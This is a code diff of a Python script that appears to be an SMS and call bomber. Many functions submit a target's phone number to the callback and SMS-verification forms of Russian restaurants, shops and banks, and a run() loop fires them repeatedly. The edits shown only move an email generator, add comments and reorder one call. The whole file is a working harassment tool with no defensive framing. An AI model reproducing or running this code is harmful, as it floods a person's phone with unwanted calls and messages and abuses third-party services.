@@ -2,6 +2,20 @@ from time import sleep
 from random import randint
 import requests
 
+def generate_email():
+    """
+    Generate e-mail
+    :return: string email
+    """
+    services = ['gmail.com', 'yandex.ru', 'outlook.com']
+    name_length = randint(6, 12)
+    name = ''
+    for i in range(name_length):
+        name += chr(randint(97, 122))
+
+    return name + '@' + services[randint(0, len(services) - 1)]
+
+# calls below (on pause now)
 
 def pizzalarenzo(phone):
     headers = {
@@ -35,7 +49,6 @@ def pizzapan(phone):
                                       headers=headers)
     print(response_pizzapan, response_pizzapan.content)
 
-
 def dostaevsky(phone):
     dstvskphn = '+7 ' + phone[:3] + ' ' + phone[3:6] + '-' + phone[6:8] + '-' + phone[8:10]
     headers = {
@@ -44,7 +57,6 @@ def dostaevsky(phone):
     response_dostaevsky = requests.post(url='https://msk.dostaevsky.ru/ajax/feedback/back_call.php',
                                         headers=headers)
     print(response_dostaevsky, response_dostaevsky.content)
-
 
 def pizzasushiwok(phone):
     headers = {
@@ -56,7 +68,6 @@ def pizzasushiwok(phone):
     response_pizzasushiwok = requests.post(url='https://pizzasushiwok.ru/', headers=headers)
     print(response_pizzasushiwok, response_pizzasushiwok.content)
 
-
 def ipizza(phone):
     ipzzphn = '%2B7' + '+' + '(' + phone[:3] + ')' + '+' + phone[3:6] + '-' + phone[6:8] + '-'\
               + phone[8:10]
@@ -66,7 +77,6 @@ def ipizza(phone):
     }
     response_ipizza = requests.post(url='https://ipizza.ru/xml/api/callback/', headers=headers)
     print(response_ipizza, response_ipizza.content)
-
 
 def okeansushi(phone):
     oknsshphn = '8' + '+' + '(' + phone[:3] + ')' + '+' + phone[3:6] + '-' + phone[6:8] +\
@@ -78,6 +88,7 @@ def okeansushi(phone):
                                              '=45&pravila2=on'))
     print(response_okeansushi, response_okeansushi.content)
 
+# SMS below
 
 def sunlight(phone):
     snlghtphn = '7' + phone
@@ -249,26 +260,11 @@ def otkr(phone):
     print(response_otkr, response_otkr.content)
 
 
-def generate_email():
-    """
-    Generate e-mail
-    :return: string email
-    """
-    services = ['gmail.com', 'yandex.ru', 'outlook.com']
-    name_length = randint(6, 12)
-    name = ''
-    for i in range(name_length):
-        name += chr(randint(97, 122))
-
-    return name + '@' + services[randint(0, len(services) - 1)]
-
-
 def run(phone, n):
     taxi2412regist(phone)
     befree(phone)
     for i in range(n):  # timeout 180
         kfc(phone)
-        ostin(phone)
         funday(phone)
         lenta(phone)
         beelinecredit(phone)
@@ -281,6 +277,7 @@ def run(phone, n):
                 sunlight(phone)
                 taxinonstop(phone)
                 sela(phone)
+                ostin(phone)
                 novextrade(phone)
                 atb(phone)
                 youla(phone)
